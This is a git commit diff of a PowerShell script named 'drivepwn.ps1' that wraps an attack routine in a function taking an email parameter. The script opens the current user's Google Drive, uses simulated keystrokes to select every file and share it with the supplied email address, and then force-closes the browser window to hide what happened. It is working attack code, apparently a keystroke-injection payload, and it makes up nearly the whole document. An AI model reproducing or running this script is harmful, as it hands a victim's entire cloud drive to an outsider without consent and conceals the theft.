27a89a8a09bfa0e801847c682b5266fa4033ef83
CaliNux <132522491+calinux-py@users.noreply.github.com>
2023-10-22 20:25:40 -0700

    Update drivepwn.ps1

--- Google Drive Pwn/drivepwn.ps1
+++ Google Drive Pwn/drivepwn.ps1
@@ -1,41 +1,51 @@
-# drive url target
-Start-Process "https://drive.google.com/drive/u/0/my-drive"
+function Access-Drive {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$em
+    )
 
-#add other drive urls:
-# "https://drive.google.com/drive/u/1/my-drive"
-# "https://drive.google.com/drive/u/2/my-drive"
-# "https://drive.google.com/drive/u/3/my-drive"
+    # drive url target
+    Start-Process "https://drive.google.com/drive/u/0/my-drive"
+    
+    # If you wish to add other drive URLs, you can uncomment and use the below lines:
+    # Start-Process "https://drive.google.com/drive/u/1/my-drive"
+    # Start-Process "https://drive.google.com/drive/u/2/my-drive"
+    # Start-Process "https://drive.google.com/drive/u/3/my-drive"
 
-Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 3
 
-Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Windows.Forms
 
-[System.Windows.Forms.SendKeys]::SendWait("^(a)")
-Start-Sleep -Milliseconds 400
+    [System.Windows.Forms.SendKeys]::SendWait("^(a)")
+    Start-Sleep -Milliseconds 400
 
-[System.Windows.Forms.SendKeys]::SendWait(".")
-Start-Sleep -Seconds 1.5
+    [System.Windows.Forms.SendKeys]::SendWait(".")
+    Start-Sleep -Seconds 1.5
 
-# enter email you want to grant access for $word
-$word = "YOUREMAIL@gmail.com"
-foreach ($letter in $word.ToCharArray()) {
-    [System.Windows.Forms.SendKeys]::SendWait($letter)
-    Start-Sleep -Milliseconds 3
+    # Enter email you want to grant access for
+    $word = $em
+    foreach ($letter in $word.ToCharArray()) {
+        [System.Windows.Forms.SendKeys]::SendWait($letter)
+        Start-Sleep -Milliseconds 3
+    }
+
+    Start-Sleep -Milliseconds 400
+
+    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+
+    Start-Sleep -Milliseconds 400
+
+    for ($i=0; $i -lt 6; $i++) {
+        [System.Windows.Forms.SendKeys]::SendWait("{TAB}")
+        Start-Sleep -Milliseconds 30  
+    }
+
+    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+
+    Start-Sleep -Seconds 3
+
+    Get-Process | Where-Object { $_.MainWindowTitle -match "Google Drive" } | Stop-Process -Force
 }
 
-Start-Sleep -Milliseconds 400
-
-[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
-
-Start-Sleep -Milliseconds 400
-
-for ($i=0; $i -lt 6; $i++) {
-    [System.Windows.Forms.SendKeys]::SendWait("{TAB}")
-    Start-Sleep -Milliseconds 30  
-}
-
-[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
-
-Start-Sleep -Seconds 3
-
-Get-Process | Where-Object { $_.MainWindowTitle -match "Google Drive" } | Stop-Process -Force
+# To use the function (pass email you want to grant access):
+# Access-Drive -em "your_email@example.com"
